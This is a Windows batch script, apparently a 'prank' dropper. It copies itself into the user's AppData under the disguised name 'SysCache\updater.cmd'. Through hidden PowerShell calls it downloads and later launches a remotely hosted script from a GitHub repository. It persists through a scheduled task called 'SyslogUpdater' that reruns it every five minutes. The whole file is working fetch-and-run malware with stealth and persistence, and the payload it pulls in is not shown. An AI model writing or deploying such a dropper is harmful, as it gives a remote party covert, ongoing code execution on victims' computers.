@echo off
setlocal enabledelayedexpansion

:: -------------------------------------------------------------------
:: Configuration – change DELAY to modify the first‑run waiting time
:: (value in seconds; 600 = 10 minutes)
:: -------------------------------------------------------------------
set "DELAY=600"

set "BASE=%APPDATA%\SysCache"
set "UPDATER=%BASE%\updater.cmd"
set "PRANK=%BASE%\syslog.cmd"
set "LOCAL_VER=%BASE%\local_version.txt"
set "VERSION_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/version.txt"
set "FILE_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/syslog.cmd"
set "REMOTE_VER=%TEMP%\rv.txt"
set "DOWNLOAD=%TEMP%\sn.cmd"
set "FIRSTRUN_FLAG=%BASE%\firstrun.flag"

if not exist "%BASE%" mkdir "%BASE%"

:: Copy this updater to the base folder (if not already there)
if /i not "%~f0"=="%UPDATER%" (
    copy /Y "%~f0" "%UPDATER%" >nul
)

:: Download remote version
powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%VERSION_URL%' -OutFile '%REMOTE_VER%' -ErrorAction Stop } catch {}" >nul 2>&1
if not exist "%REMOTE_VER%" goto RUN

set /p REMOTE=<"%REMOTE_VER%"
if exist "%LOCAL_VER%" set /p LOCAL=<"%LOCAL_VER%"

if not "%LOCAL%"=="%REMOTE%" (
    powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%FILE_URL%' -OutFile '%DOWNLOAD%' -ErrorAction Stop } catch {}" >nul 2>&1
    if exist "%DOWNLOAD%" (
        move /Y "%DOWNLOAD%" "%PRANK%" >nul
        echo %REMOTE% > "%LOCAL_VER%"
        :: Signal that this is the first installation – the prank should be started after a delay
        echo. > "%FIRSTRUN_FLAG%"
    )
)

:RUN
:: Handle the first‑run delay if the flag exists
if exist "%FIRSTRUN_FLAG%" (
    :: Launch a hidden command window that waits for DELAY seconds and then starts the prank
    start /min cmd /c "timeout /t %DELAY% /nobreak >nul & start \"\" \"%PRANK%\""
    del "%FIRSTRUN_FLAG%"
)
:: On subsequent runs the flag is gone, so the prank is not started again.
:: (If you later want to restart the prank when it exits, you can add a check here.)

:: Create scheduled task that runs THIS UPDATER every 5 minutes
schtasks /create /tn "SyslogUpdater" /tr "cmd /c start /min \"\" \"%UPDATER%\"" /sc minute /mo 5 /f >nul 2>&1

endlocal